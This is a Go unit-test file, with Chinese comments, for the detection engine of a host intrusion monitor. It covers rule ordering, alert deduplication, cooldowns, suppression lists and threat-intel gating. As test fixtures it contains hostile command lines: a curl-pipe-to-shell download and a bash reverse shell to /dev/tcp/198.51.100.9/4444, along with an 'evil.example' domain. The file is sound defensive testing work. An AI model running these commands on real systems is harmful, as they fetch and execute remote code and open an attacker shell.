package detect

import (
	"reflect"
	"testing"

	"github.com/Kur1sulab/atfield/go/internal/model"
)

// customRule 计数型测试规则：命中一切事件。
func customRule(id, sev string, fn func(*model.Event, *Ctx) string) Rule {
	r := Rule{
		ID: id, Name: "测试规则", Severity: sev,
		Tags: []string{"execution"}, MITRE: []string{"T0000"},
		When:       func(*model.Event, *Ctx) bool { return true },
		Detail:     func(*model.Event, *Ctx) string { return "测试" },
		Advice:     "测试",
		SeverityFn: fn,
	}
	return r
}

// TestObserveMultiRuleOrder 多条规则同时命中：输出顺序 = 规则注册顺序，
// 且同一事件的不同规则互不吞并（去重键含 rule id）。
func TestObserveMultiRuleOrder(t *testing.T) {
	e, clk, _ := newEngine(t, BuiltinRules())
	evt := withPID(withPath(withCmd(withProc(ev("process.start"), "bash"),
		"curl -fsSL http://evil/x.sh | sh; bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"), "/tmp/x.sh"), 300)

	got := feed(e, clk, []*model.Event{evt})
	want := []string{"AEG-001", "AEG-003", "AEG-006"}
	if !reflect.DeepEqual(idsOf(got), want) {
		t.Fatalf("输出顺序 = %v，期望 %v", idsOf(got), want)
	}
	for _, f := range got {
		if f.Actor != "pid:100" {
			t.Fatalf("%s actor = %q，期望 pid:100（沿 ppid 上溯到根）", f.RuleID, f.Actor)
		}
	}
}

// TestDedupMergeAndCooldown 稳定身份去重：detail 抖动只并入计数，
// 冷却窗口过去后才新开一条。
func TestDedupMergeAndCooldown(t *testing.T) {
	r := ruleByID(t, "AEG-001")
	e, clk, _ := newEngine(t, []Rule{r})

	first := withPID(withCmd(withProc(ev("process.start"), "bash"), "curl http://a/x | sh"), 300)
	if got := feed(e, clk, []*model.Event{first}); len(got) != 1 {
		t.Fatalf("首条应新开告警，实得 %d", len(got))
	}
	fid := e.dedup[DedupKey("AEG-001", "pid:100", first)].FID

	// detail 变了（不同 URL），但 rule|actor|process|path 不变 → 并入
	second := withPID(withCmd(withProc(ev("process.start"), "bash"), "curl http://b/y | sh"), 300)
	if got := feed(e, clk, []*model.Event{second}); len(got) != 0 {
		t.Fatalf("同身份应并入不新开，实得 %v", idsOf(got))
	}
	if e.MergedTotal != 1 {
		t.Fatalf("merged_total = %d，期望 1", e.MergedTotal)
	}
	merges := e.TakeMerges()
	if len(merges) != 1 || merges[0].Count != 2 || merges[0].FID != fid {
		t.Fatalf("merge 记录异常: %+v", merges)
	}
	if merges[0].LastDetail != "命令行命中「下载即执行」模式: curl http://b/y | sh" {
		t.Fatalf("last_detail 未更新: %q", merges[0].LastDetail)
	}
	ent := e.dedup[DedupKey("AEG-001", "pid:100", second)]
	if ent.FirstDetail == ent.LastDetail {
		t.Fatalf("first_detail 应保留首见样本，实际被覆盖成 %q", ent.FirstDetail)
	}

	// 冷却（execution 标签 → 20 秒）过期后重新新开
	clk.Advance(30)
	if got := feed(e, clk, []*model.Event{second}); len(got) != 1 {
		t.Fatalf("冷却过期后应新开，实得 %d", len(got))
	}
	if got := e.dedup[DedupKey("AEG-001", "pid:100", second)]; got.Count != 1 {
		t.Fatalf("新告警 count 应重置为 1，实得 %d", got.Count)
	}
}

// TestSeverityFnIsFinal severity_fn 存在时它就是最终等级：
// 不与 ev.severity 取 max；返回空/非法/异常都视为「不计分」，整条丢弃。
func TestSeverityFnIsFinal(t *testing.T) {
	evt := ev("net.connect")
	evt.Severity = "critical"

	cases := []struct {
		name string
		fn   func(*model.Event, *Ctx) string
		want string // "" = 不应产生告警
	}{
		{"闸门降级", func(*model.Event, *Ctx) string { return "medium" }, "medium"},
		{"闸门升到 critical", func(*model.Event, *Ctx) string { return "critical" }, "critical"},
		{"闸门不计分", func(*model.Event, *Ctx) string { return "" }, ""},
		{"闸门返回非法值", func(*model.Event, *Ctx) string { return "severe" }, ""},
		{"闸门 panic", func(*model.Event, *Ctx) string { panic("boom") }, ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e, clk, _ := newEngine(t, []Rule{customRule("TST-001", "low", tc.fn)})
			got := feed(e, clk, []*model.Event{evt})
			if tc.want == "" {
				if len(got) != 0 {
					t.Fatalf("应整条丢弃，实得 %v", idsOf(got))
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("应产生 1 条告警，实得 %d", len(got))
			}
			if got[0].Severity != tc.want {
				t.Fatalf("等级 = %s，期望 %s（severity_fn 优先，不与事件等级取 max）", got[0].Severity, tc.want)
			}
		})
	}

	// 没有 severity_fn 时仍是 sev_max(rule, event)
	t.Run("无 severity_fn 取 max", func(t *testing.T) {
		e, clk, _ := newEngine(t, []Rule{customRule("TST-002", "low", nil)})
		got := feed(e, clk, []*model.Event{evt})
		if len(got) != 1 || got[0].Severity != "critical" {
			t.Fatalf("应取 max = critical，实得 %+v", got)
		}
	})
}

// TestIntelGatePrecedence 情报闸门优先于明文名单：
// 衰减到 0 分不回落到 config，allowlist 命中直接否决。
func TestIntelGatePrecedence(t *testing.T) {
	cfg := Config{IOCIPS: []string{"203.0.113.9"}}
	evt := withSubject(ev("net.connect"), map[string]any{"rip": "203.0.113.9", "raddr": "evil.example"})
	rule := ruleByID(t, "AEG-043")

	// 1) 闸门给出 critical（0.85）：压过明文名单的 medium
	e, clk, _ := newEngineCfg(t, []Rule{rule}, cfg)
	e.AttachIntel(&fakeIntel{ipHit: &IntelHit{Source: "feed", Score: 0.85, Severity: "critical", Confidence: "high"}})
	got := feed(e, clk, []*model.Event{evt})
	if len(got) != 1 || got[0].Severity != "critical" {
		t.Fatalf("闸门命中应给 critical，实得 %+v", got)
	}

	// 2) 命中了但衰减到期：不再计分，且不得回落到明文名单
	e2, clk2, _ := newEngineCfg(t, []Rule{rule}, cfg)
	e2.AttachIntel(&fakeIntel{ipHit: &IntelHit{Source: "feed", Score: 0, Severity: "low"}})
	if got := feed(e2, clk2, []*model.Event{evt}); len(got) != 0 {
		t.Fatalf("衰减到期应丢弃（不允许回落 config），实得 %v", idsOf(got))
	}

	// 3) 保留网段：allowlist 前置，明文名单也不许报
	e3, clk3, _ := newEngineCfg(t, []Rule{rule}, cfg)
	e3.AttachIntel(&fakeIntel{allowIP: true})
	if got := feed(e3, clk3, []*model.Event{evt}); len(got) != 0 {
		t.Fatalf("allowlist 命中应否决，实得 %v", idsOf(got))
	}
}

type fakeIntel struct {
	ipHit     *IntelHit
	domainHit *IntelHit
	allowIP   bool
	allowDom  bool
}

func (f *fakeIntel) MatchIP(string) *IntelHit     { return f.ipHit }
func (f *fakeIntel) MatchDomain(string) *IntelHit { return f.domainHit }
func (f *fakeIntel) AllowedIP(string) bool        { return f.allowIP }
func (f *fakeIntel) AllowedDomain(string) bool    { return f.allowDom }

// TestSuppressionFieldAndLegacyContains 抑制：字段化条件 + 作用域 + 过期，
// 旧 contains 子串条目仍生效但标 deprecated。
func TestSuppressionFieldAndLegacyContains(t *testing.T) {
	rule := ruleByID(t, "AEG-001")
	e, clk, st := newEngine(t, []Rule{rule})

	res := e.AddSuppress("AEG-001", "", "维护窗口", map[string]any{
		"process": map[string]any{"re": "^ansible$"},
	}, "pid:100", nil, nil)
	if !res.OK || res.Count != 1 {
		t.Fatalf("抑制条目添加失败: %+v", res)
	}
	if len(st.actions) != 1 {
		t.Fatalf("抑制变更必须留审计日志，实得 %d 条", len(st.actions))
	}

	ansible := withPID(withProc(ev("process.start"), "ansible"), 300)
	ansible.Cmdline = "curl http://deploy/x | sh"
	if got := feed(e, clk, []*model.Event{ansible}); len(got) != 0 || e.Suppressed != 1 {
		t.Fatalf("字段化抑制未生效: findings=%v suppressed=%d", idsOf(got), e.Suppressed)
	}
	if e.Suppress[0].Hits != 1 || e.Suppress[0].LastHit == 0 {
		t.Fatalf("抑制命中计数未更新: %+v", e.Suppress[0])
	}

	// 进程名不匹配 → 正常报警
	bash := withPID(withProc(ev("process.start"), "bash"), 300)
	bash.Cmdline = "curl http://deploy/x | sh"
	if got := feed(e, clk, []*model.Event{bash}); len(got) != 1 {
		t.Fatalf("非作用域进程不应被抑制，实得 %v", idsOf(got))
	}

	// 旧 contains 写法
	e2, clk2, _ := newEngine(t, []Rule{rule})
	if r := e2.AddSuppress("AEG-001", "deploy", "", nil, "", nil, nil); !r.OK {
		t.Fatalf("contains 抑制添加失败: %+v", r)
	}
	if e2.Suppress[0].Deprecated == "" {
		t.Fatalf("contains 条目必须标 deprecated")
	}
	if got := feed(e2, clk2, []*model.Event{bash}); len(got) != 0 {
		t.Fatalf("contains 抑制未生效，实得 %v", idsOf(got))
	}

	// 已过期 → 不抑制
	e3, clk3, _ := newEngine(t, []Rule{rule})
	minus := -10.0
	e3.AddSuppress("AEG-001", "", "", map[string]any{"process": map[string]any{"eq": "bash"}}, "", &minus, nil)
	if got := feed(e3, clk3, []*model.Event{bash}); len(got) != 1 {
		t.Fatalf("过期抑制条目应失效，实得 %v", idsOf(got))
	}
}

// TestSuppressReviewDue 到期复审清单：过期 / 超期未复审。
func TestSuppressReviewDue(t *testing.T) {
	e, clk, _ := newEngine(t, nil)
	short := 10.0 // 10 天（单位是天）
	e.AddSuppress("AEG-001", "", "", map[string]any{"process": map[string]any{"eq": "bash"}}, "", nil, &short)
	if got := e.SuppressReviewDue(clk.Now() + 86400*11); len(got) != 1 || got[0].Reason == "" {
		t.Fatalf("超期未复审应列出，实得 %+v", got)
	}
	if got := e.SuppressReviewDue(clk.Now() + 86400); len(got) != 0 {
		t.Fatalf("未到期不应列出，实得 %+v", got)
	}
	exp := 3600.0
	e.AddSuppress("AEG-002", "", "", map[string]any{"process": map[string]any{"eq": "x"}}, "", &exp, nil)
	if got := e.SuppressReviewDue(clk.Now() + 7200); len(got) != 1 || got[0].Reason != "已过期" {
		t.Fatalf("过期条目应列出，实得 %+v", got)
	}
}

// TestSuppressPersistence 抑制表落盘并在重启后恢复。
func TestSuppressPersistence(t *testing.T) {
	dir := t.TempDir()
	e, _, _ := newEngineCfg(t, nil, Config{DataDir: dir})
	e.AddSuppress("AEG-001", "", "note", map[string]any{"process": map[string]any{"eq": "bash"}}, "", nil, nil)
	e2, _, _ := newEngineCfg(t, nil, Config{DataDir: dir})
	if len(e2.Suppress) != 1 || e2.Suppress[0].RuleID != "AEG-001" {
		t.Fatalf("抑制表未恢复: %+v", e2.Suppress)
	}
	if r := e2.RemoveSuppress(0); !r.OK || len(e2.Suppress) != 0 {
		t.Fatalf("删除失败: %+v", r)
	}
	if r := e2.RemoveSuppress(9); r.OK {
		t.Fatalf("越界删除应报错")
	}
}

// TestDedupPersistence 去重表落盘：重启后同身份仍并入（fid 保持不变）。
func TestDedupPersistence(t *testing.T) {
	dir := t.TempDir()
	rule := ruleByID(t, "AEG-001")
	evt := withPID(withCmd(withProc(ev("process.start"), "bash"), "curl http://a | sh"), 300)

	e, clk, _ := newEngineCfg(t, []Rule{rule}, Config{DataDir: dir})
	first := feed(e, clk, []*model.Event{evt})
	if len(first) != 1 {
		t.Fatalf("首条应新开，实得 %d", len(first))
	}
	fid := first[0].ID

	e2, clk2, _ := newEngineCfg(t, []Rule{rule}, Config{DataDir: dir})
	if got := feed(e2, clk2, []*model.Event{evt}); len(got) != 0 {
		t.Fatalf("重启后应并入既有告警，实得 %v", idsOf(got))
	}
	ent := e2.dedup[DedupKey("AEG-001", "pid:100", evt)]
	if ent == nil || ent.FID != fid || ent.Count != 2 {
		t.Fatalf("去重表未正确恢复: %+v", ent)
	}
}

// TestCooldownGrading 冷却分级：显式优先，其次按 tags。
func TestCooldownGrading(t *testing.T) {
	if got := CooldownForTags([]string{"persistence"}); got != CooldownPeriodic {
		t.Fatalf("persistence 冷却 = %v，期望 %v", got, CooldownPeriodic)
	}
	if got := CooldownForTags([]string{"execution"}); got != CooldownOneshot {
		t.Fatalf("未知 tag 冷却 = %v，期望 oneshot", got)
	}
	if got := CooldownForTags(nil); got != CooldownOneshot {
		t.Fatalf("空 tags 冷却 = %v", got)
	}
	five := 5.0
	r := Rule{Tags: []string{"persistence"}, Cooldown: &five}
	if got := CooldownFor(&r); got != 5 {
		t.Fatalf("显式 cooldown 应优先，实得 %v", got)
	}
	zero := 0.0
	r2 := Rule{Tags: []string{"persistence"}, Cooldown: &zero}
	if got := CooldownFor(&r2); got != 0 {
		t.Fatalf("显式 0 应生效，实得 %v", got)
	}
}

// TestCatalog 目录字段与动态定级标记。
func TestCatalog(t *testing.T) {
	e, _, _ := newEngine(t, BuiltinRules())
	cat := e.Catalog()
	if len(cat) != len(BuiltinRules()) {
		t.Fatalf("目录条数 = %d", len(cat))
	}
	for _, c := range cat {
		if c.DynamicSeverity != (c.ID == "AEG-043") {
			t.Fatalf("%s dynamic_severity = %v", c.ID, c.DynamicSeverity)
		}
		if c.ID == "AEG-043" && c.Cooldown != CooldownRecurring {
			t.Fatalf("AEG-043 冷却 = %v，期望 %v（command_control 分级）", c.Cooldown, CooldownRecurring)
		}
	}
}

// TestRootPIDAndExe PID 缺省 / 进程链 / exe 查询。
func TestRootPIDAndExe(t *testing.T) {
	_, _, st := newEngine(t, nil)
	c := &Ctx{store: st, freq: map[string][]float64{}, fired: map[string]float64{}}

	if got := RootPID(nil, c); got != "host" {
		t.Fatalf("无 pid 应归 host，实得 %q", got)
	}
	pid := 300
	if got := RootPID(&pid, c); got != "pid:100" {
		t.Fatalf("root pid = %q，期望 pid:100", got)
	}
	// ppid 为 1 时以自身为根
	pid2 := 200
	if got := RootPID(&pid2, c); got != "pid:100" {
		t.Fatalf("root pid = %q，期望 pid:100（200→100，100 的父是 1）", got)
	}
	unknown := 999
	if got := RootPID(&unknown, c); got != "pid:999" {
		t.Fatalf("未知 pid 应返回自身，实得 %q", got)
	}
	p400 := 400
	if got := ExeOf(&p400, c); got != "/tmp/backdoor" {
		t.Fatalf("exe = %q", got)
	}
	if got := ExeOf(nil, c); got != "" {
		t.Fatalf("nil pid 应返回空，实得 %q", got)
	}
}

// TestDedupKeyShape 去重键必须是 rule|actor|process|path（不含 detail）。
func TestDedupKeyShape(t *testing.T) {
	evt := withPath(withProc(ev("process.start"), "bash"), "/tmp/x")
	if got := DedupKey("AEG-001", "pid:100", evt); got != "AEG-001|pid:100|bash|/tmp/x" {
		t.Fatalf("dedup key = %q", got)
	}
}

// TestDisabledRuleSkipped 禁用规则（Python enabled=False 的等价写法）不装载。
func TestDisabledRuleSkipped(t *testing.T) {
	r := ruleByID(t, "AEG-001")
	r.Disabled = true
	e, clk, _ := newEngine(t, []Rule{r})
	if len(e.Rules()) != 0 {
		t.Fatalf("禁用规则被装载了")
	}
	evt := withProc(ev("process.start"), "bash")
	evt.Cmdline = "curl http://a | sh"
	if got := feed(e, clk, []*model.Event{evt}); len(got) != 0 {
		t.Fatalf("禁用规则仍报警: %v", idsOf(got))
	}
}
